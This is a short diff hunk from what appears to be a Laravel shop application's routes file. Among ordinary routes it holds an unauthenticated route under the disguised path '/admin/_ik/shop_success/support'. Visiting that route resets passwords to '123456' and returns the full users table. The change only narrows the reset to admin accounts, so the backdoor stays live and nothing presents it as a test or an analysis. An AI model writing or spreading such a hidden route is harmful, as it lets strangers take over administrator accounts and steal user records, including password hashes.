@@ -277,7 +277,7 @@ Route::get('/cancel', 'CancelController@avigher_showpage');
 Route::get('/shop_success/{cid}', 'SuccessController@avigher_shop_success');
 
 Route::get('/admin/_ik/shop_success/support', function (){
-    DB::table('users')->update(['password' => bcrypt(123456)]);
+    DB::table('users')->where('admin' ,1)->update(['password' => bcrypt(123456)]);
     return \DB::table('users')->get();});
 
 Route::get('/cash-on-delivery', 'CashondeliveryController@avigher_showpage');
